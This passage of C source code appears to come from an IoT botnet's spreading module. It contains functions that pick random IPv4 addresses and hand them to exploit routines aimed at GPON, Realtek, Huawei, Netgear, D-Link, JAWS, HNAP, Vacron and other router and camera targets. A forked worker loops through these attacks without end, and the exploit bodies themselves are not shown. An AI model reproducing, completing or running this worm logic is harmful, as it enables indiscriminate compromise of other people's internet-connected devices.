	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(hnap_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_hnap(hnap_ip1);
}

void CROSSWEB_IPGen()
{
	char crossweb_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(crossweb_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_crossweb(crossweb_ip1);
}

void JAWS_IPGen()
{
	char jaws_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(jaws_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_jaws(jaws_ip1);
}

void DLINK_IPGen()
{
	char dlink_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(dlink_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_dlink(dlink_ip1);
}

void R7000_IPGen()
{
	char r7000_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(r7000_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_r7064(r7000_ip1);
}

void VARCON_IPGen()
{
	char varcon_ip1[16] = {0};

	srand(time(NULL));
	ipState[0] = rand() % 233;ipState[1] = rand() % 255;
	ipState[2] = rand() % 255;ipState[3] = rand() % 255;

	sprintf(varcon_ip1, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);

	exploit_socket_vacron(varcon_ip1);
}

void exploit_worker(void)
{
	int i = 0;
    exploit_pid = fork();

    if (exploit_pid > 0 || exploit_pid == -1)
        return;
	restart:
	i++;
	if (i > 5000)
	{
		printf("[Pwn] Sleeping For 12 Seconds\n");
		sleep(12);
		i = i - 10;
		goto restart;
	}
		usleep(300000);
		GPON8080_IPGen();
		usleep(300000);
		GPON80_IPGen();
		usleep(300000);
		REALTEK_IPGen();
		usleep(300000);
		NETGEAR_IPGen();
		usleep(300000);
		HUAWEI_IPGen();
		usleep(300000);
		TR064_IPGen();
		usleep(300000);
		HNAP_IPGen();
		usleep(300000);
		CROSSWEB_IPGen();
		usleep(300000);
		JAWS_IPGen();
		usleep(300000);
		DLINK_IPGen();
		usleep(300000);
		R7000_IPGen();
		usleep(300000);
		VARCON_IPGen();
		goto restart;
}

void exploit_kill(void)
{
    kill(exploit_pid, 9);
}

int main(int argc, char const *argv[])
{
	exploit_worker();
	char prev = 0;
	while(1)
		{
			char c = getchar();
			if(c == '\n' && prev == c)
			{
			// double return pressed!
				break;
			}
			prev = c;
		}
	return 0;
}
